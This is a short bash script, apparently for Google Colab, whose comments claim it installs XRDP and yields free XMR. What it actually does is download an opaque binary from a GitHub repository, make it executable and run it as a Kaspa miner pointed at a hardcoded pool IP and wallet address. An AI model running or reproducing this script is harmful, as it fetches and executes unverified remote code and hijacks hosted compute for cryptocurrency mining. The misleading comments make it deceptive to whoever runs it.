# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R AkubapakMU

wget https://github.com/aqshakuy/kasepak/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=178.128.86.41:80
WALLET=kaspa:qzeks2y5gtf2fn0k4dlzwemwszc4fkwx0xtrgnhn68x38ymnlxrj27uzhcqky

./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
